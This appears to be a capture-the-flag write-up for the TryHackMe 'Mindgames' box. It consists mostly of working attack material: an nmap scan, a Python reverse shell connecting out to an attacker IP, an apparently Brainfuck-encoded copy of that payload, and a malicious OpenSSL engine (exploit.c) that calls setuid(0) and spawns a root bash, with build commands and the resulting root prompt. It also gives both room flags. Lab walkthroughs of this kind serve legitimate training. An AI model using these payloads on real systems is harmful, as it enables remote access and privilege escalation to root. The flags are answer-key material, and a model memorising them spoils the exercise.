**Tristan Gomez**

nmap
```
└─$ nmap -sV -Pn 10.10.97.98
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 10:19 PDT
Nmap scan report for 10.10.97.98
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.36 seconds
```

reverse shell payload
```
def F():
  import socket,os,pty
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(("10.8.248.108",1111))
  os.dup2(s.fileno(),0)
  os.dup2(s.fileno(),1)
  os.dup2(s.fileno(),2)
  pty.spawn("/bin/sh")
  
F()
```

```
+++++ +++++ [->++ +++++ +++<] >.+.+ .<+++ +++++ [->-- ----- -<]>- -----
.<+++ +++[- >++++ ++<]> ++.<+ ++++[ ->--- --<]> ----- .+.<+ +++[- >++++
<]>+. <++++ ++[-> ----- -<]>- ----- ---.- --.<+ +++[- >++++ <]>++ ++++.
.<+++ +++++ [->++ +++++ +<]>+ +++++ +++.+ +++.+ ++.-. +++.+ +.<++ +++++
++[-> ----- ----< ]>--- .<+++ +++++ +[->+ +++++ +++<] >++.- ---.< +++[-
>---< ]>--- .++++ ++++. ----- -.<++ +[->+ ++<]> +++++ +.<++ +++++ +[->-
----- --<]> ----- ---.< +++++ +++[- >++++ ++++< ]>+++ .++++ .<+++ +++++
[->-- ----- -<]>- ----- -.<++ +++++ +[->+ +++++ ++<]> ++++. ++++. +++++
.<+++ +++++ ++[-> ----- ----- <]>-- ----- -.--- .<+++ +[->+ +++<] >++++
++..< +++++ ++++[ ->+++ +++++ +<]>+ +.<++ +++++ [->-- ----- <]>-- ---.<
+++++ ++[-> +++++ ++<]> +++++ .---- .<+++ [->-- -<]>- --.++ +++++ +.---
---.< +++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>--- ---.< +++++
+++[- >++++ ++++< ]>+++ ++.-- --.<+ ++[-> ---<] >---. +++++ +++.- -----
.<+++ [->++ +<]>+ +++++ .<+++ +++++ [->-- ----- -<]>- ----- ----- -.<++
+++++ +[->+ +++++ ++<]> +++++ +++++ +.--- -.<++ +[->- --<]> ---.+ +++++
++.-- ----. <+++[ ->+++ <]>++ ++++. <++++ ++++[ ->--- ----- <]>-- ----.
<++++ [->++ ++<]> +++.+ ++++. <++++ +[->+ ++++< ]>.<+ +++[- >---- <]>--
----. +++++ .---- ----- .<+++ [->++ +<]>+ +++++ .<+++ +++[- >---- --<]>
----. <++++ ++++[ ->+++ +++++ <]>++ +++++ .---- .<+++ [->-- -<]>- --.++
+++++ +.--- ---.< +++[- >+++< ]>+++ +++.< +++++ +++[- >---- ----< ]>---
---.< +++++ +[->+ +++++ <]>+. ----. <+++[ ->--- <]>-- -.+++ +++++ .<+++
+[->+ +++<] >++++ .<+++ [->-- -<]>- --.+. --.<+ ++[-> ---<] >---- .----
.<+++ [->++ +<]>+ ++.<+ +++++ [->-- ----< ]>.<+ ++++[ ->--- --<]> ---.-
--.<+ +++[- >++++ <]>++ ++++. .<+++ +++++ +[->+ +++++ +++<] >++.< +++++
+++[- >---- ----< ]>--- --.<+ +++++ +[->+ +++++ +<]>+ +++.< +++[- >+++<
]>+++ .-..- ----- ---.- -.<++ ++[-> ++++< ]>+.< +++++ +++[- >---- ----<
]>--- ----- ----. .---- --.<+ ++[-> +++<] >++++ ++.-. --.<+ ++[-> +++<]
>+.<+ ++[-> ---<] >-.++ ++.++ .++++ .<+++ [->-- -<]>- .+++. -.+++ +++++
.<+++ +[->- ---<] >---- --.<+ ++[-> +++<] >+.++ +++.. ..--- ----- ..<++
+++[- >---- -<]>- --.-- -.<++ ++[-> ++++< ]>+++ +++.. <++++ ++++[ ->+++
+++++ <]>++ +++++ +++++ +++.+ +++.< +++++ +++[- >---- ----< ]>--- --.<+
+++++ +[->+ +++++ +<]>+ ++++. <++++ [->++ ++<]> +.--- --.<+ +++++ +[->-
----- -<]>- ----- ----- --.<+ ++[-> ---<] >-.<+ +++++ ++[-> +++++ +++<]
>++++ +++++ ++.<+ +++++ ++[-> ----- ---<] >---- -.<++ +++++ [->++ +++++
<]>++ +++++ .+++. +++.- ----- -.+++ +++++ +.+.< +++++ +++[- >---- ----<
]>--- ----. +.+++ .++++ .---- ---.< +++++ [->-- ---<] >---. ---.< ++++[
->+++ +<]>+ +++++ ..<++ +++++ +[->+ +++++ ++<]> +++++ +++++ +++++ .++++
.<+++ +++++ [->-- ----- -<]>- ----. <++++ +++[- >++++ +++<] >++++ +.<++
++[-> ++++< ]>+.- ----. <++++ +++[- >---- ---<] >---- ----- ----. <+++[
->--- <]>-. <++++ ++++[ ->+++ +++++ <]>++ +++++ ++++. <++++ ++++[ ->---
----- <]>-- ---.< +++++ ++[-> +++++ ++<]> +++++ ++.++ +.+++ .---- ---.+
+++++ +++.+ .<+++ +++++ [->-- ----- -<]>- ----- -.+.+ ++.++ +++.- -----
--.<+ ++++[ ->--- --<]> ---.- --.<+ +++[- >++++ <]>++ ++++. .<+++ +++++
[->++ +++++ +<]>+ +++++ +++++ ++++. ++++. <++++ ++++[ ->--- ----- <]>--
---.< +++++ ++[-> +++++ ++<]> +++++ .<+++ +[->+ +++<] >+.-- ---.< +++++
++[-> ----- --<]> ----- ----- ---.< +++[- >---< ]>-.< +++++ +++[- >++++
++++< ]>+++ +++++ +++.< +++++ +++[- >---- ----< ]>--- --.<+ +++++ +[->+
+++++ +<]>+ +++++ +.+++ .+++. ----- --.++ +++++ ++.+. <++++ ++++[ ->---
----- <]>-- ----- .+.++ +.+++ +++.- ----- ---.< +++++ [->-- ---<] >---.
---.< ++++[ ->+++ +<]>+ +++++ ..<++ +++++ +[->+ +++++ ++<]> +++++ +++++
+++++ +.+++ +.+++ ++.<+ +++++ ++[-> ----- ---<] >---- ----- --.<+ +++++
++[-> +++++ +++<] >++++ +.--- .<+++ [->-- -<]>- ----- .<+++ +[->+ +++<]
>++++ ++.-- ----- --.<+ +++++ ++[-> ----- ---<] >---- --.-- ----. <+++[
->+++ <]>++ ++.<+ +++++ +[->+ +++++ +<]>+ +.+++ ++++. +++++ .<+++ ++++[
->--- ----< ]>--- ----- ----- -.<++ +++++ +[->+ +++++ ++<]> ++++. <+++[
->--- <]>-- .<+++ +++++ [->-- ----- -<]>- ----- .++++ +++.< +++++ [->--
---<] >---. ---.< ++++[ ->+++ +<]>+ +++++ ..<++ ++[-> ----< ]>--- .---.
<++++ +++[- >++++ +++<] >++++ +++++ ++.<+ ++++[ ->--- --<]> ----- .+.<+
++++[ ->--- --<]> ---.- --.<
```

flag1 `thm{411f7d38247ff441ce4e134b459b6268}`

```
/bin/ping
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
...
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
...
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
...
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
...
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
...
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/newuidmap

```

gtfobins
```
Library load
It loads shared libraries that may be used to run code in the binary execution context.

openssl req -engine ./lib.so
```

https://www.aldeid.com/wiki/TryHackMe-Mindgames
https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/

exploit.c
```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/engine.h>

static const char *engine_id = "silly";
static const char *engine_name = "A silly engine for demonstration purposes";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  
  setuid(0);
  setgid(0);
  system("/bin/bash");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

```

`gcc -fPIC -o exploit.o -c exploit.c`
`gcc -shared -o exploit.so -lcrypto exploit.o`

```
mindgames@mindgames:~/webserver$ openssl req -engine ./exploit.so
openssl req -engine ./exploit.so
root@mindgames:~/webserver# 
```

`thm{1974a617cc84c5b51411c283544ee254}`
